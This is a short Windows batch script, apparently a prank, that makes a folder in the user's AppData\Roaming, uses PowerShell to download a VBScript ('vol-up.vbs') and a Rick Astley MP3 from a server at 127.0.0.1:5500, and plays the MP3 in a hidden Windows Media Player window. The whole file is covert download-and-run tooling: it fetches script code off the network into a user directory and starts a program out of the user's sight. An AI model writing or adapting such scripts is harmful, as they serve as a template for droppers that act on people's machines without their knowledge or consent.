@echo off
setlocal enabledelayedexpansion
mkdir %userprofile%\AppData\Roaming\a\balls\
set "FilesToDownload[0].URL=http://127.0.0.1:5500/vol-up.vbs"
set "FilesToDownload[0].Destination=%userprofile%\AppData\Roaming\a\balls\vol-up.vbs"

set "FilesToDownload[1].URL=http://127.0.0.1:5500/rickroll.mp3"
set "FilesToDownload[1].Destination=%userprofile%\AppData\Roaming\a\balls\rickroll.mp3"

set MP3File=%userprofile%\AppData\Roaming\a\balls\rickroll.mp3

for /L %%i in (0, 1, 1) do (
    set "URL=!FilesToDownload[%%i].URL!"
    set "Destination=!FilesToDownload[%%i].Destination!"

    powershell -command "(New-Object Net.WebClient).DownloadFile('!URL!', '!Destination!')"
)

powershell -Command "Start-Process -FilePath 'C:\Program Files\Windows Media Player\wmplayer.exe' -ArgumentList '/play /close \"%MP3File%\"' -WindowStyle Hidden -Wait"
